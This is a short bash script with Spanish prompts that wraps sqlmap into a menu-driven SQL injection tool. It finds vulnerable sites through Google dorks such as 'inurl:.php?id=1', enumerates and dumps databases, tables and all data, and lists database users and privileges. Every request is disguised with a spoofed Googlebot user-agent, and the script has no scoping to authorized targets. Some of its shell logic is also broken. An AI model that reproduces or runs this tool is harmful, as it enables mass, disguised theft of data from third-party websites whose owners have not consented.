#!/usr/bin/env bash
#set -x
#findsqlmap=$(/usr/bin/find / -iname sqlmap.py 2> /dev/null)
findsqlmap="/usr/bin/sqlmap"
#echo $findsqlmap | wc -l
agent="Mozilla 5 (compatible , Googlebot/2.1, http://www.google.com/bot.html)"

function databases() {

read -p $'entry url : \n' url
	$findsqlmap -u  $url --dbs --threads=10 --user-agent=$agent
	while true; do
		read -p $'Show databases with tables ? Y/N \n' op
			case $op in
				[yY] )read -p $'Entry name database : \n' database 
					$findsqlmap -u $url -D $database --tables --threads=10 --user-agent=$agent
				while true; do	
					read -p $'dump table ? Y/N \n' tab
					case $tab in
						y|Y)read -p $'Entry name table : \n' name
					$findsqlmap -u $url -D $database -T $name --columns --dump --threads=10 --user-agent=$agent
					
					while true; do	
						read -p $'Dump All Databases ? Y/N \n' resp
						    case $resp in
							y|Y) $findsqlmap -u $url --dump-all --threads=10 --user-agent=$agent; return 1;;
							n|N) printf "saliendo..\n"; return 1;;
							*) printf "error..\n";;
						    esac 
						done; return 0;;

						n|N) printf "saliendo..\n"; return 1;;
						*) printf "error..\n";;
					esac
				done; return 0;;
				[nN]) printf "saliendo\n"; return 1;;
				*) printf "error..\n";;
			esac
	done

}

function dorks (){

dork=

while [ -z "$dork"] 2> /dev/null; do
	read -p $'Entry dork : Eje inurl: .php?id=1 \n' dork
	[ "$dork" != "" ] && $findsqlmap -g "$dork" --user-agent=$agent
	#[ "$dork" == "" ] && echo || $findsqlmap -g "$dork" 
done
}

function identity(){
regex='(https?|ftp|file|http|^www)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
url=
	#while ! [[  "${url}" =~ ${regex} ]]; do
	while [[ -z "$url" ]]; do
		read -p $'Entry url \n' url
	[[ $url =~ $regex ]] && $findsqlmap -u $url --current-user --user-agent=$agent \
		$findsqlmap -u $url --users --user-agent=$agent \
		$findsqlmap -u $url --privileges --user-agent=$agent
	done

}

[[ $(echo $findsqlmap | wc -l) != 1 ]] && echo "sqlmap not installed.." && exit || \
	while [[ op != 4 ]] 2> /dev/null; do

		printf "1-Databases\n" 
		printf "2-Data WEB Relationship\n"
		printf "3-Dork\n"
		printf "4-Salir\n"

	read -p "entry option: " op

	case $op in
		1)databases;;
		2)identity;;
		3)dorks;;
		4)exit;;
		*)printf "error\n";;
	esac
done
